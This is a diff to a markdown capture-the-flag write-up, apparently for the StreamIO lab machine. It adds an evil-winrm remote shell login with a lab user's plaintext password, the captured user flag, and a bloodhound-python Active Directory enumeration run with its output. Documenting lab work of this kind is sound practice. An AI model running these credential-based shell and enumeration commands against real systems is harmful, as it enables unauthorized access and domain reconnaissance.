@@ -918,16 +918,60 @@ WINRM       10.129.154.2    5985   DC               [+] streamIO.htb\nikk37:get_
 ---
 ## User Flag
 
-### Lateral Movement (if applicable)
+```
+evil-winrm -i streamio.htb -u 'nikk37' -p 'get_dem_girls2@yahoo.com'           
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\nikk37\Documents> cd ..
+*Evil-WinRM* PS C:\Users\nikk37> cd Desktop
+*Evil-WinRM* PS C:\Users\nikk37\Desktop> cat user.txt
+bcf0435640f5c7101ad9c7fd518cb996
+*Evil-WinRM* PS C:\Users\nikk37\Desktop> 
 
-Steps to move from initial foothold to user access.
+```
 
 ---
-## Privilege Escalation
+## Lateral movement from nikk37 to 
 
 ### Enumeration
 
-What you found that leads to root/admin.
+```
+sudo bloodhound-python -u 'nikk37' -p 'get_dem_girls2@yahoo.com' -ns 10.129.154.2 -d streamio.htb -c all --zip 
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: streamio.htb
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.streamio.htb:88)] [Errno -2] Name or service not known
+INFO: Connecting to LDAP server: dc.streamio.htb
+INFO: Testing resolved hostname connectivity dead:beef::1aa
+INFO: Trying LDAP connection to dead:beef::1aa
+INFO: Testing resolved hostname connectivity dead:beef::1e8:822e:a8c4:4cf7
+INFO: Trying LDAP connection to dead:beef::1e8:822e:a8c4:4cf7
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.streamio.htb
+INFO: Testing resolved hostname connectivity dead:beef::1aa
+INFO: Trying LDAP connection to dead:beef::1aa
+INFO: Testing resolved hostname connectivity dead:beef::1e8:822e:a8c4:4cf7
+INFO: Trying LDAP connection to dead:beef::1e8:822e:a8c4:4cf7
+INFO: Found 8 users
+INFO: Found 54 groups
+INFO: Found 4 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.streamIO.htb
+INFO: Done in 00M 09S
+INFO: Compressing output into 20261002121937_bloodhound.zip
+
+```
 
 ### Exploitation
 
